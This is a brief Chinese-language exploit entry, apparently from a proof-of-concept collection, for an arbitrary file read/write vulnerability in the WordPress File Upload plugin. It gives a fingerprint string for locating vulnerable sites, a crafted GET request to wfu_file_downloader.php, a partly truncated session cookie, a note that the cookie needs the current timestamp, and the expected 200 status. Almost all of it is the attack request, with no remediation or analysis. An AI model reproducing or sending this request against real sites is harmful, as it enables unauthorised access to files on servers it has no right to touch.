# WordPressFileUpload插件存在任意文件读取漏洞

- **系统**：WordPress　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"wp-content/plugins/wp-file-upload"`
- **请求**：`GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce HTTP/1.1`
- **关键头**：`Cookie: wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC…`

**请求体 / payload**
```
cookie中需指定当前时间戳
```
- **预期**：200　|　—